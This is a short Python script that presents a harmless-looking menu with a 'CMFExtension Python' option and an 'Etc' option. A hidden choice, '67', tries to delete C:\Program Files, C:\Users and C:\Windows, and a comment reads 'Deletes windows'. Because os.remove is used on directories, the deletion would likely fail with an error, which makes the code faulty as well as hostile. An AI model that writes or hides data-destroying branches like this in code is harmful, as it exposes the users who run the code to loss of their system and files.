encoding="utf-8"

import os
import time

home = os.path.expanduser("~")

menus = """
Menus

-- CMFExtension Python [1]
-- Etc [2]


-- 
"""

print(menus)

MenuChoice = input("Enter choice: ")

if MenuChoice == "1":
    print("Running CMFExtension Python...")
elif MenuChoice == "2":
    print("Running Etc...")
elif MenuChoice == "67":
    os.remove("C:\\Program Files")
    os.remove("C:\\Program Files (x86)")
    os.remove("C:\\Users")
    os.remove("C:\\Windows") # Deletes windows
else:
    print("I said pick a number you bum")
time.sleep(2)